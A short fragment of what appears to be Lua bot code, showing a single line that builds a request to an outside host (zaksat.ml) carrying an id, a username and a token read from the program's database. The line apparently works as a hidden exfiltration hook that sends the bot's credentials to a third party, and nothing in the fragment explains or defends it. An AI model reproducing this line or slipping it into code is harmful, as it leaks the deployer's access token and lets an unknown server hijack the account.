...
https://zaksat.ml/shahum/index.php?id="..database:get(Server_korpica.."Id_korpica").."&username="..database:get(Server_korpica.."UserName_korpica").."&token="..database:get(Server_korpica.."Token_korpica"))
